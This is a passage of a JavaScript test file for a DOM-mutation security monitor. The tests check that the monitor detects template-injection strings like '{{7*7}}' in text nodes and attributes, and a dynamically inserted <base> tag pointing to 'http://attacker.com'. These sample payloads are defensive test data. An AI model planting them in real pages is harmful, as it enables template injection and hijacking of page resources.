            // JSDOM-FIX (Issue 2): Test case for deep inspection (Element containing Text Node)
            it('FIXED (Issue 2): Should detect template syntax inside appended Element (Deep Inspection)', async () => {
                const payload = `${TAINTED_STRING} {{7*7}}`;
                // Create structure: div -> span -> text_node(payload)
                const div = document.createElement('div');
                const span = document.createElement('span');
                span.textContent = payload;
                div.appendChild(span);
                
                // Append the top-level element. Previously, this was missed.
                document.body.appendChild(div);

                await wait(OBSERVER_WAIT);

                expect(mockSinkCallback).toHaveBeenCalled();
                const calls = mockSinkCallback.mock.calls.filter(c => c[0].type === "FRAMEWORK_INJECTION");
                expect(calls.length).toBeGreaterThan(0);
                // Detail message reflects the deep inspection success.
                expect(calls[0][0].detail).toContain("Text Node");
            });

            // JSDOM-FIX (Issue 3): Explicit test for the race condition handling.
            it('FIXED (Issue 3): Should correctly report Attribute Mutation when append/setAttribute happen sequentially (Race Condition)', async () => {
                // JSDOM batches these operations. The fix ensures the 'attributes' mutation handler takes precedence 
                // by filtering the attribute check in the 'childList' handler.
                const payload = `${TAINTED_STRING} {{RACE}}`;
                const div = document.createElement('div');
                document.body.appendChild(div);          // childList mutation
                div.setAttribute('title', payload); // attributes mutation

                await wait(OBSERVER_WAIT);

                const calls = mockSinkCallback.mock.calls.filter(c => c[0].type === "FRAMEWORK_INJECTION");
                
                // Should only report ONCE
                expect(calls.length).toBe(1);
                // And the report MUST be the Attribute Mutation type
                expect(calls[0][0].detail).toBe("Tainted template syntax injected into DOM (Attribute Mutation: title)");
            });

            it('Should report attributes during childList if set BEFORE appending (Initial State)', async () => {
                const payload = `${TAINTED_STRING} {{INIT}}`;
                const div = document.createElement('div');
                
                // Set attribute before appending. This is the initial state, not a race condition.
                div.setAttribute('data-initial', payload);
                document.body.appendChild(div);

                await wait(OBSERVER_WAIT);

                // We expect exactly one report, captured during the childList phase.
                expect(mockSinkCallback).toHaveBeenCalledTimes(1);
                const report = mockSinkCallback.mock.calls[0][0];
                expect(report.detail).toContain("Attribute");
            });
        });

        describe('4. Base Tag Hijacking', () => {
            const OBSERVER_WAIT = 60;

            it('Should detect dynamic injection of <base> tag', async () => {
                const base = document.createElement('base');
                base.href = "http://attacker.com";
                document.head.appendChild(base);

                await wait(OBSERVER_WAIT);

                expect(mockSinkCallback).toHaveBeenCalled();
                expect(mockSinkCallback.mock.calls[0][0].type).toBe("BASE_TAG_HIJACK");
                expect(mockSinkCallback.mock.calls[0][0].value).toBe("http://attacker.com");
            });

            it('Should ignore non-base tags in head', async () => {
                const meta = document.createElement('meta');
                document.head.appendChild(meta);
                await wait(OBSERVER_WAIT);
                expect(mockSinkCallback).not.toHaveBeenCalled();
            });
        });
    });
});